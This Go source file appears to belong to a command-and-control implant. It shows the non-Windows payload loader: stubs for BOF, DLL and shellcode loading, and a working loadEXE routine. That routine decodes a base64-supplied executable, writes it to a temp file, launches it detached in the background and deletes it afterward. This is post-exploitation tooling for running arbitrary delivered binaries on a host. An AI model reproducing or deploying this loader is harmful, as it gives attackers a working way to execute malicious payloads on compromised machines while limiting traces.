//go:build !windows && !light

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func splitArgs(s string) []string {
	var args []string
	var current strings.Builder
	inQuote := false

	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c == '"':
			inQuote = !inQuote
		case c == ' ' && !inQuote:
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
		default:
			current.WriteByte(c)
		}
	}

	if current.Len() > 0 {
		args = append(args, current.String())
	}

	return args
}

func loadBOF(data string, args string) (string, int32, string) {
	return "", -1, "BOF loading is only supported on Windows"
}

func loadEXE(data string, args string) (string, int32, string) {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
	}

	tempPath := filepath.Join(os.TempDir(), fmt.Sprintf("plugin_%d", os.Getpid()))

	if err := os.WriteFile(tempPath, decoded, 0755); err != nil {
		return "", -1, fmt.Sprintf("write file failed: %v", err)
	}

	var cmd *exec.Cmd
	if args != "" {
		cmd = exec.Command(tempPath, splitArgs(args)...)
	} else {
		cmd = exec.Command(tempPath)
	}

	// 非阻塞启动：子进程在后台独立运行
	if err := cmd.Start(); err != nil {
		os.Remove(tempPath)
		return "", -1, fmt.Sprintf("start failed: %v", err)
	}

	go func() {
		cmd.Process.Wait()
		os.Remove(tempPath)
	}()

	return fmt.Sprintf("started PID %d", cmd.Process.Pid), 0, ""
}

func loadDLL(data string) (string, int32, string) {
	return "", -1, "DLL loading is only supported on Windows"
}

func loadShellcode(data string) (string, int32, string) {
	return "", -1, "Shellcode loading is only supported on Windows"
}
